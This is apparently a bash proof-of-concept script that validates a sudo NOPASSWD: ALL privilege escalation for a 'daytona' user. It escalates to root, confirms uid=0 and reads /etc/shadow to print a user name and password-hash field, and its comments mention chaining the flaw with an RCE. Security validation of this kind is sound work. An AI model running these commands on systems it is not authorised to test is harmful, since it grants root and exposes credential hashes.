#!/bin/bash

# POC: Privilege Escalation via Sudo NOPASSWD: ALL Configuration
# This script validates the privilege escalation vulnerability where the 'daytona' user
# has unrestricted sudo access without password requirements.
#
# Prerequisites: Must be run as the 'daytona' user or have access to its environment

echo "=========================================="
echo "Privilege Escalation via Sudo NOPASSWD POC"
echo "=========================================="
echo ""

# Verify current user
CURRENT_USER=$(whoami)
echo "[*] Current user: $CURRENT_USER"
echo ""

# Test 1: Check if user is in sudoers with NOPASSWD
echo "[+] TEST 1: Checking sudo privileges for current user..."
SUDO_CHECK=$(sudo -l 2>&1)
if echo "$SUDO_CHECK" | grep -q "NOPASSWD: ALL"; then
    echo "[✓] VULNERABLE: User has NOPASSWD: ALL sudo access"
    echo "$SUDO_CHECK"
    VULN_CONFIRMED=1
else
    echo "[!] No NOPASSWD: ALL configuration found"
    VULN_CONFIRMED=0
fi
echo ""

# Test 2: Attempt to escalate to root without password
echo "[+] TEST 2: Attempting to escalate to root via sudo..."
ROOT_CHECK=$(sudo whoami 2>&1)
if [ "$ROOT_CHECK" = "root" ]; then
    echo "[✓] VULNERABLE: Successfully escalated to root!"
    echo "[*] sudo whoami returned: $ROOT_CHECK"
    ESCALATION_SUCCESS=1
else
    echo "[!] Could not escalate to root"
    echo "[*] Output: $ROOT_CHECK"
    ESCALATION_SUCCESS=0
fi
echo ""

# Test 3: Verify privilege level
if [ $ESCALATION_SUCCESS -eq 1 ]; then
    echo "[+] TEST 3: Verifying root privilege level..."
    ROOT_ID=$(sudo id 2>&1)
    echo "[*] sudo id output: $ROOT_ID"
    
    if echo "$ROOT_ID" | grep -q "uid=0"; then
        echo "[✓] CONFIRMED: Root access verified (uid=0)"
    fi
fi
echo ""

# Test 4: Demonstrate impact - access to sensitive files
echo "[+] TEST 4: Demonstrating impact - accessing root-only files..."
if [ $ESCALATION_SUCCESS -eq 1 ]; then
    echo "[*] Attempting to read /etc/shadow (requires root)..."
    SHADOW_ACCESS=$(sudo cat /etc/shadow 2>&1 | head -1)
    if echo "$SHADOW_ACCESS" | grep -q ":"; then
        echo "[✓] SUCCESS: Root-only file access confirmed!"
        echo "[*] /etc/shadow readable - first line preview:"
        echo "$SHADOW_ACCESS" | cut -d: -f1-2
    else
        echo "[!] Could not access /etc/shadow"
    fi
fi
echo ""

# Summary
echo "=========================================="
echo "SUMMARY"
echo "=========================================="
if [ $VULN_CONFIRMED -eq 1 ] && [ $ESCALATION_SUCCESS -eq 1 ]; then
    echo "[✓✓] PRIVILEGE ESCALATION VULNERABILITY CONFIRMED"
    echo ""
    echo "Impact: User '$CURRENT_USER' can execute ANY command as root without password"
    echo "Combined with RCE vulnerability, this allows complete system compromise"
    exit 0
else
    echo "[!] Vulnerability not confirmed in current environment"
    exit 1
fi